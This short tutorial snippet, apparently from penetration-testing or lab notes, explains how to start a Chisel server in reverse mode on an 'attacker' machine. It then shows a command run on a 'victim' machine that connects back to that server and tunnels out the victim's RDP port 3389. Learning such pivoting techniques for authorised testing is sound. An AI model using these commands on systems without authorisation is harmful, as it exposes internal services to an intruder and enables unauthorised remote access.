Step-by-step instructions
Start the Chisel server on your machine (attacker) with reverse mode enabled:

chisel server -p 8000 --reverse

This makes the server listen on port 8000 and accept reverse tunnels. 
On the client (victim/target machine), connect back to the server and forward a local service (e.g., port 3389 RDP):

chisel client 10.10.14.3:8000 R:3389:127.0.0.1:3389

Replace 10.10.14.3 with your server’s IP. This forwards the client’s localhost port 3389 to the server. 
